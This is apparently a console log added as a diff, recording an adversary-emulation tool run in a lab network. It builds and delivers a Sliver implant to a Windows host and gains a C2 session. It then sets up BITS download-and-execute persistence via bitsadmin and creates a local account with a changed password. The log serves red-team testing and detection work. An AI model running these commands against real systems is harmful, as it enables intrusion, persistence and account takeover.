@@ -1,0 +1,216 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260713T163756Z-78114f34/chain-001]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sl.exe' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the target payload file                                     │
+│ 3. Download the payload file                                                           │
+│ 4. Execute the payload file to C:\Users\Public\chain_sl.exe as Admin (Root)            │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 3
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+     DULL_COUGH@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: dd3838e0-d971-4c37-a687-500e43417179, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 4
+
+📌[Name] Environment Variable Retrieval
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] dd3838e0-d971-4c37-a687-500e43417179 - DULL_COUGH@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+ Parameter Input
+  Parameter: name
+  Description: Environment variable name to query
+➤ Enter value for name (current: 'USERNAME' , required: True): 
+
+[Sliver Executor] Executing: get_env
+Keep going with the next attack step? [y/n] (y): 
+Environment variable: Variables {
+  Key: "USERNAME"
+  Value: "useradmin"
+}
+
+
+📌[Sliver Session Derive] Step 5
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: dd3838e0-d971-4c37-a687-500e43417179
+  ↳ Derived executor_derived executor from Sliver session dd3838e0-d971-4c37-a687-500e43417179
+
+📌[Command Prompt Executor] Step 6
+
+📌[Name] Persist, Download, & Execute
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke bitsadmin.
+  ✓ Using stored value: dd3838e0-d971-4c37-a687-500e43417179
+ Parameter Input
+  Parameter: bits_job_name
+  Description: BITS job name.
+➤ Enter value for bits_job_name (current: 'AuroraChainBITS' , required: True): 
+ Parameter Input
+  Parameter: remote_file
+  Description: URL of a file for BITS to download (payload delivery vehicle).
+➤ Enter value for remote_file (current: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md' , required: True): 
+ Parameter Input
+  Parameter: local_file
+  Description: Target-side destination for the BITS download.
+➤ Enter value for local_file (current: 'C:\\Users\\Public\\bits_download.dat' , required: True): 
+ Parameter Input
+  Parameter: command_path
+  Description: Command invoked via `/setnotifycmdline` on BITS state change.
+➤ Enter value for command_path (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  bitsadmin.exe /create "AuroraChainBITS"
+bitsadmin.exe /addfile "AuroraChainBITS" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md" 
+"C:\Users\Public\bits_download.dat"
+bitsadmin.exe /setnotifycmdline "AuroraChainBITS" "C:\Windows\System32\notepad.exe" NULL
+bitsadmin.exe /resume "AuroraChainBITS"
+ping -n 5 127.0.0.1 >nul 2>&1
+bitsadmin.exe /complete "AuroraChainBITS"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: bitsadmin.exe /create AuroraChainBITS
+  stdout: 
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Created job {EEB4E956-1DF3-43D7-8A22-A7BEAD3A99B9}.
+Executing with cmd.exe: bitsadmin.exe /addfile AuroraChainBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\Public\bits_download.dat
+  stdout: 
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Added https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -> C:\Users\Public\bits_download.dat to job.
+Executing with cmd.exe: bitsadmin.exe /setnotifycmdline AuroraChainBITS C:\Windows\System32\notepad.exe NULL
+  stdout: 
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+notification command line set to 'C:\Windows\System32\notepad.exe' 'NULL'.
+Executing with cmd.exe: bitsadmin.exe /resume AuroraChainBITS
+  stdout: 
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Job resumed.
+Executing with cmd.exe: ping -n 5 127.0.0.1 >nul 2>&1
+Executing with cmd.exe: bitsadmin.exe /complete AuroraChainBITS
+  stdout: 
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Job completed.
+
+📌[Command Prompt Executor] Step 7
+
+📌[Name] Change User Password - Windows
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke net.
+  ✓ Using stored value: dd3838e0-d971-4c37-a687-500e43417179
+ Parameter Input
+  Parameter: user_account
+  Description: Local user whose password will be rotated (created if absent).
+➤ Enter value for user_account (current: 'AuroraPilot001' , required: True): 
+ Parameter Input
+  Parameter: initial_password
+  Description: Initial password if the account has to be created first.
+➤ Enter value for initial_password (current: 'Init!ChgPW23' , required: True): 
+ Parameter Input
+  Parameter: new_password
+  Description: New password that replaces the original — attacker-only.
+➤ Enter value for new_password (current: 'Rot@ted!PW#42' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  net user AuroraPilot001 Init!ChgPW23 /add
+net.exe user AuroraPilot001 Rot@ted!PW#42
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: net user AuroraPilot001 Init!ChgPW23 /add
+  stdout: The command completed successfully.
+Executing with cmd.exe: net.exe user AuroraPilot001 Rot@ted!PW#42
+  stdout: The command completed successfully.
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                             Start                    End                      Duration  Status
+   1  Build the executable file of a Sliver implant (for Windows)                      2026-07-17 17:59:47 UTC  2026-07-17 17:59:53 UTC      5.3s    ✓   
+   2  Simulate the victim download and execute malicious payload file as Admin (Root)  2026-07-17 17:59:53 UTC  2026-07-17 18:00:11 UTC     17.8s    ✓   
+   3  Execute a Sliver Implant Payload                                                 2026-07-17 18:00:11 UTC  2026-07-17 18:00:12 UTC      1.7s    ✓   
+   4  Environment Variable Retrieval                                                   2026-07-17 18:00:12 UTC  2026-07-17 18:00:16 UTC      3.5s    ✓   
+   5  Execute Command (cmd.exe)                                                        2026-07-17 18:00:16 UTC  2026-07-17 18:00:16 UTC      0.0s    ✓   
+   6  Persist, Download, & Execute                                                     2026-07-17 18:00:16 UTC  2026-07-17 18:00:29 UTC     13.8s    ✓   
+   7  Change User Password - Windows                                                   2026-07-17 18:00:29 UTC  2026-07-17 18:00:37 UTC      7.9s    ✓   
+
+  Total: 7 steps executed (7 ✓, 0 ?, 0 ✗) in 50.0s
+══════════════════════════════════════════════════════════════════════
